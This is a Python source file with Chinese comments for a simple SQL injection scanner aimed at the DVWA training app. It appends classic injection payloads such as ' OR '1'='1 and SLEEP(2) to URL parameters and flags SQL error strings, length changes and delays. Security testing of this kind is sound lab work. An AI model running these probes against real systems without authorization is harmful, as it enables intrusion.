from __future__ import annotations

import argparse
import copy
import re
import sys
import time
from typing import Dict, List, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError


# 常见数据库报错特征，命中越多，越可疑
SQL_ERROR_PATTERNS = [
    r"SQL syntax",
    r"mysql_fetch",
    r"mysqli_fetch",
    r"You have an error in your SQL syntax",
    r"Warning: mysql_",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ODBC SQL",
    r"PDOException",
    r"SQLite/JDBCDriver",
]


# 常见测试 payload
TEST_PAYLOADS = [
    "'",
    "\"",
    "'-- ",
    "' OR '1'='1",
    "' OR 1=1#",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND SLEEP(2)",
]

# SQL 注入扫描属于启发式安全检测：阈值越低越容易发现可疑点，但误报也会增加。
# 因此这些值只用于定位需要人工复核的参数，不应直接作为漏洞定性的唯一依据。
LENGTH_CHANGE_SUSPICIOUS_RATIO = 0.35
TIME_DELAY_SUSPICIOUS_SECONDS = 1.2
DEFAULT_USER_AGENT = "DVWA-SQLI-Scanner/0.1"
DEFAULT_ACCEPT_HEADER = "text/html,application/xhtml+xml"


def parse_cookie(cookie_text: str) -> Dict[str, str]:
    """把形如 a=1; b=2 的 cookie 字符串转成字典。"""
    cookie_dict: Dict[str, str] = {}
    if not cookie_text.strip():
        # 没传 cookie 就直接返回空，后面会按未登录态去请求
        return cookie_dict

    parts = cookie_text.split(";")
    for part in parts:
        part = part.strip()
        if not part or "=" not in part:
            # 遇到脏片段直接跳过，不让它影响整体解析
            continue
        k, v = part.split("=", 1)
        cookie_dict[k.strip()] = v.strip()
    return cookie_dict


def build_cookie_header(cookies: Dict[str, str]) -> str:
    if not cookies:
        return ""
    # 拼成标准 Cookie 请求头格式：a=1; b=2
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


def split_url_and_params(raw_url: str) -> Tuple[str, Dict[str, List[str]]]:
    """
    从 URL 提取基础地址和 query 参数。
    例如：
    http://a/b?id=1&x=2 -> base=http://a/b, params={id:[1], x:[2]}
    """
    parsed = urlparse(raw_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    clean_parsed = parsed._replace(query="", fragment="")
    base_url = urlunparse(clean_parsed)
    return base_url, params


def send_get(url: str, headers: Dict[str, str], timeout: float) -> Dict[str, object]:
    """发起 GET 请求，返回状态码、正文和耗时。"""
    req = Request(url=url, headers=headers, method="GET")
    begin = time.perf_counter()
    try:
        with urlopen(req, timeout=timeout) as resp:
            # 页面乱码时忽略非法字符，保证程序不断
            body = resp.read().decode("utf-8", errors="ignore")
            elapsed = time.perf_counter() - begin
            return {"status": resp.status, "body": body, "elapsed": elapsed}
    except HTTPError as e:
        # 就算是 4xx/5xx，也尽量把响应体拿回来继续分析
        body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
        elapsed = time.perf_counter() - begin
        return {"status": e.code, "body": body, "elapsed": elapsed}
    except URLError as e:
        # 网络不通、域名错误之类会走这里
        elapsed = time.perf_counter() - begin
        return {"status": 0, "body": f"[请求失败] {e}", "elapsed": elapsed}


def has_sql_error(text: str) -> List[str]:
    """返回命中的 SQL 报错模式列表。"""
    hit = []
    for p in SQL_ERROR_PATTERNS:
        # 不区分大小写，省得漏掉大小写不同的报错文案
        if re.search(p, text, flags=re.IGNORECASE):
            hit.append(p)
    return hit


def build_url(base_url: str, params: Dict[str, List[str]]) -> str:
    return f"{base_url}?{urlencode(params, doseq=True)}"


def build_default_headers(cookies: Dict[str, str]) -> Dict[str, str]:
    """构造扫描请求头。Cookie 可能包含会话凭据，使用时应避免提交到公共仓库。"""
    headers = {
        # UA 不重要，主要是有些站会对空 UA 比较敏感
        "User-Agent": DEFAULT_USER_AGENT,
        "Accept": DEFAULT_ACCEPT_HEADER,
    }
    cookie_header = build_cookie_header(cookies)
    if cookie_header:
        headers["Cookie"] = cookie_header
    return headers


def scan_sqli(
    base_url: str,
    original_params: Dict[str, List[str]],
    headers: Dict[str, str],
    timeout: float,
) -> List[Dict[str, object]]:
    findings: List[Dict[str, object]] = []

    baseline_url = build_url(base_url, original_params)
    baseline = send_get(baseline_url, headers, timeout)

    if baseline["status"] == 0:
        print("[!] 基线请求失败，请先确认 URL、网络和 Cookie。")
        print("    失败信息:", baseline["body"])
        return findings

    baseline_len = len(str(baseline["body"]))
    # 先记住正常页面长度，后面所有 payload 都拿它来比

    for param_name in original_params.keys():
        # 一个参数一个参数扫，方便最后定位问题点
        for payload in TEST_PAYLOADS:
            mutated_params = copy.deepcopy(original_params)
            # 只改参数第一个值，简单直接
            current_value = mutated_params.get(param_name, [""])
            if current_value:
                # 直接在原值后拼 payload，这样更接近真实攻击输入
                current_value[0] = f"{current_value[0]}{payload}"
            else:
                current_value = [payload]
            mutated_params[param_name] = current_value

            test_url = build_url(base_url, mutated_params)
            result = send_get(test_url, headers, timeout)

            # 规则 1：直接出现 SQL 报错
            result_body = str(result["body"])
            error_hits = has_sql_error(result_body)
            if error_hits:
                # 只要抓到典型 SQL 报错，优先认为是高可疑
                findings.append(
                    {
                        "param": param_name,
                        "payload": payload,
                        "reason": f"命中 SQL 报错特征: {', '.join(error_hits)}",
                        "status": result["status"],
                        "elapsed": result["elapsed"],
                    }
                )
                continue

            # 规则 2：响应长度变化异常
            length_gap = abs(len(result_body) - baseline_len)
            ratio = length_gap / max(1, baseline_len)
            if ratio > LENGTH_CHANGE_SUSPICIOUS_RATIO:
                # 这里阈值是经验值，主要用来快速筛可疑点
                findings.append(
                    {
                        "param": param_name,
                        "payload": payload,
                        "reason": f"响应长度变化较大 (差值 {length_gap}, 比例 {ratio:.2f})",
                        "status": result["status"],
                        "elapsed": result["elapsed"],
                    }
                )
                continue

            # 规则 3：简单时间延迟判断（针对 sleep payload）
            if (
                "sleep" in payload.lower()
                and (float(result["elapsed"]) - float(baseline["elapsed"])) > TIME_DELAY_SUSPICIOUS_SECONDS
            ):
                # 同一环境下明显变慢，通常就值得人工继续确认
                findings.append(
                    {
                        "param": param_name,
                        "payload": payload,
                        "reason": (
                            f"疑似时间延迟注入 (基线 {float(baseline['elapsed']):.2f}s, "
                            f"当前 {float(result['elapsed']):.2f}s)"
                        ),
                        "status": result["status"],
                        "elapsed": result["elapsed"],
                    }
                )

    return findings


def format_findings(findings: List[Dict[str, object]]) -> str:
    if not findings:
        return "[+] 未发现明显 SQL 注入迹象（不代表绝对安全）。"

    lines = ["[!] 发现可疑点如下："]
    for idx, item in enumerate(findings, start=1):
        # 输出尽量写全一点，方便直接看是哪个参数触发的
        lines.append(
            (
                f"{idx}. 参数={item['param']} | payload={item['payload']} | "
                f"状态码={item['status']} | 耗时={float(item['elapsed']):.2f}s\n"
                f"   原因: {item['reason']}"
            )
        )
    return "\n".join(lines)


def main() -> int:
    parser = argparse.ArgumentParser(description="DVWA SQL 注入简易扫描工具")
    parser.add_argument("--url", required=True, help="目标 URL，需包含 query 参数")
    parser.add_argument("--cookie", default="", help="可选，Cookie 字符串")
    parser.add_argument("--timeout", type=float, default=8.0, help="请求超时时间（秒）")
    args = parser.parse_args()

    base_url, params = split_url_and_params(args.url)

    if not params:
        print("[!] URL 中没有 query 参数，无法扫描。")
        print("    示例: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit")
        return 1

    cookies = parse_cookie(args.cookie)
    headers = build_default_headers(cookies)

    print("=" * 60)
    print("DVWA SQL 注入简易扫描工具")
    print("=" * 60)
    print(f"[*] 目标基础 URL: {base_url}")
    print(f"[*] 参数列表: {', '.join(params.keys())}")

    findings = scan_sqli(
        base_url=base_url,
        original_params=params,
        headers=headers,
        timeout=args.timeout,
    )

    print()
    print(format_findings(findings))
    return 0


if __name__ == "__main__":
    sys.exit(main())
